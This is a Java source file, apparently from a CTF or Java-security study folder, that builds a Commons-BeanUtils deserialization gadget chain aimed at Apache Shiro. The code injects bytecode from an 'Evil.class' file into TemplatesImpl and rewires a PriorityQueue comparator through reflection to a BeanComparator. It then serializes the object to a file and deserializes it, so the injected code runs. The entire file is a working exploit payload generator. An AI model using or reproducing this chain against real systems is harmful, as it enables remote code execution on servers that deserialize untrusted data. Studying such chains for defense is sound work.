package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ConstantTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class shiroBC {

    public static void main(String[] args) throws Exception{

        //CC3
        TemplatesImpl templatesImpl = new TemplatesImpl();
        Field _nameField = TemplatesImpl.class.getDeclaredField("_name");
        _nameField.setAccessible(true);
        _nameField.set(templatesImpl, "aaa");
        Field _bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        _bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\ctf_tools\\java_study\\tmp\\Evil.class"));
        byte[][] codes = new byte[][]{code};
        _bytecodesField.set(templatesImpl, codes);
        Field _tfactoryField = TemplatesImpl.class.getDeclaredField("_tfactory");
        _tfactoryField.setAccessible(true);
        _tfactoryField.set(templatesImpl, new TransformerFactoryImpl());
//        PropertyUtils.getProperty(templatesImpl,"outputProperties");

        //CB
        BeanComparator beanComparator = new BeanComparator("outputProperties",null);

        //CC2
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);
        priorityQueue.add(templatesImpl);
        priorityQueue.add(2);

        Field fieldcomparator = PriorityQueue.class.getDeclaredField("comparator");
        fieldcomparator.setAccessible(true);
        fieldcomparator.set(priorityQueue,beanComparator);

        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream("./cc.bin"));
        objectOutputStream.writeObject(priorityQueue);
        objectOutputStream.close();
//        //反序列化
        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream("./cc.bin"));
        objectInputStream.readObject();
    }
}
